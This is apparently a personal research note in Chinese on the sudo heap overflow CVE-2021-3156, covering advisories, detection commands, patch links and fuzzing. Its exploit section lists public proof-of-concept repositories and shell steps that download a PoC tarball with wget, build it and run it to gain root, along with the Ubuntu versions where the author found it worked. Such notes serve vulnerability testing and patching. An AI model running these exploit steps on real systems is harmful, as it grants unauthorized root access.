# linux 漏洞

## [Sudo缓冲区溢出漏洞（CVE-2021-3156）](http://www.nsfocus.net/vulndb/52555)

Sudo 1.8.2-1.8.31p2和1.9.0-1.9.5p1版本存在缓冲区溢出漏洞。
攻击者可通过“sudoedit -s”和以单个反斜杠字符结尾的命令行参数利用该漏洞获得系统root权限。

解决办法
[【安全通报】Sudo 堆缓冲区溢出漏洞 （CVE-2021-3156）](https://nosec.org/home/detail/4664.html)

[不用密码就能获取root权限？sudo被曝新漏洞](https://www.freebuf.com/news/262127.html)
视频显示
[源出处](https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)

[官方](https://www.sudo.ws/alerts/unescape_overflow.html)

### 测试确认/批量检测

https://www.bleepingcomputer.com/news/security/new-linux-sudo-flaw-lets-local-users-gain-root-privileges/

简单测试
sudoedit -s '\' 112233445566
env -i 'AA=a\' 'B=b\' 'C=c\' 'D=d\' 'E=e\' 'F=f' sudoedit -s '1234567890123456789012\'

[cve-2021-3156-sudo堆溢出简单分析 ](https://bbs.pediy.com/thread-265669.htm)

测试版本:
https://github.com/sudo-project/sudo/archive/SUDO_1_9_5p1.tar.gz
https://github.com/sudo-project/sudo/archive/SUDO_1_8_27.tar.gz

现在版本:
Sudo version 1.8.27
Sudo version 1.8.21p2

阿里的 sudo 漏洞居然没有
但 https://www.exploit-db.com/ 有其它 POC

Sudo 1.8.25p - 'pwfeedback' Buffer Overflow
https://www.exploit-db.com/exploits/48052
sudo 1.8.27 - Security Bypass
https://www.exploit-db.com/exploits/47502
ptrace - Sudo Token Privilege Escalation (Metasploit)
https://www.exploit-db.com/exploits/47345

### exploit 利用

这个不知道能不能? 好像不行,回头看看是干什么的?
https://github.com/TH3xACE/SUDO_KILLER
https://github.com/TH3xACE/SUDO_KILLER/blob/6327a45cfb028d6140e10a6e799ac54af0711d14/SUDO_KILLERv2.0.6.sh

https://github.com/Mr-xn/Penetration_Testing_POC
这个只有两个可执行文件,好像不行
https://github.com/mr-r3b00t/CVE-2021-3156

这个只有一个1.c
https://github.com/reverse-ex/CVE-2021-3156

**这个亲测可以利用的**

电报群里发的：，但是只能用于特定的版本
对应: https://github.com/blasty/CVE-2021-3156
$ vagrant init ubuntu/focal64
$ vagrant up
$ vagrant ssh
$ wget https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz
$ tar -xzvf *.tar.gz
$ cd CVE-2021-3156
$ make
./sudo-hax-me-a-sandwich
可以用, 18.04.4也没有问题,gitlab版本更新了18.04.5
  available targets:
  ------------------------------------------------------------
    1) Ubuntu 18.04.4 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    2) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    3) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    4) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
另外的一个，不知道用法：
问题: 现在看 只有上面的版本可用

https://github.com/blasty/CVE-2021-3156

这个版本不行,应该是参数不对
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-52-generic x86_64)

使用 Ubuntu 18.04.5 
18.04.2 不可以
18.04.4 可以 
18.04.5 可以

其它有视频可以完成的:

https://twitter.com/r4j0x00/status/1355489323794108417
https://github.com/r4j0x00/exploits/tree/master/CVE-2021-3156

https://github.com/stong/CVE-2021-3156
https://twitter.com/gf_256/status/1355354178588180481

这个总结好几个能用的: 注:我和上面的三个一样
https://github.com/ltfafei/CVE-2021-3156/

twitter 视频模糊

[Twitter视频下载器](https://www.savetweetvid.com/zh)

### 修复:

https://omvapt.com/blog/how-to-update-sudo-packages-manually-to-fix-the-buffer-overflow-vulnerability-cve-2021-3156how-to-update-sudo-packages-manually-to-fix-the-vulnerability-sudo-flaw-lets-linux-users-run-commands-as-roo/

https://github.com/sudo-project/sudo/releases/download/SUDO_1_9_5p2/sudo_1.9.5-3_ubu1604_amd64.deb
https://github.com/sudo-project/sudo/releases/download/SUDO_1_9_5p2/sudo_1.9.5-3_ubu1804_amd64.deb
https://github.com/sudo-project/sudo/releases/download/SUDO_1_9_5p2/sudo_1.9.5-3_ubu2004_amd64.deb

sudo gdebi sudo_1.9.5-3_ubu2004_amd64.deb 

新版本下载: https://www.sudo.ws/download.html

修复 ansible
https://github.com/ymrsmns/CVE-2021-3156

https://s4-cs-pub-std.oss-cn-hangzhou.aliyuncs.com/chat_upload/tid613/image_1606884484072_sqc34.jpg
https://s4-cs-pub-std.oss-cn-hangzhou.aliyuncs.com/chat_upload/tid5261/image_1611839171605_qga5o.jpg

### 原理研究:

https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156

AFL模糊器(American Fuzzy lop)

[AFL实战：测试sudo提权漏洞CVE-2021-3156](https://netsecurity.51cto.com/art/202101/643772.htm#topx)
> 假设并行运行了4个实例，大约2小时的CPU时间。
> 通过2小时的CPU时间测试，就可以在setuid中找到严重的安全漏洞

视频讲解
https://github.com/mbcrump/CVE-2021-3156
https://www.youtube.com/watch?v=iRIXXUNkgAM
00:00 - Introduction
01:29 - What's a CVE?
02:22 - What's the bug?
05:30 - Exploit shown in action
13:07 - Sudo versions affected
13:48 - WSL Windows Subsystem for Linux
15:11 - Detecting if you are vulnerable through sudo (WSL)
19:21 - Detecting if you are vulnerable through sudo (Ubuntu)
20:53 - Detecting if you are vulnerable through commands
24:58 - What to do if you are running K8s or containers
27:54 - Examine Sudo versions
28:30 - Patching WSL 
30:17 - Patching Ubuntu 
32:09 - Where can I get exploit.c? 
33:59 - Patching Ubuntu (part 2)
38:10 - Patching WSL (part 2)
46:35 - GitHub search results
47:28 - Patching WSL (part 3)
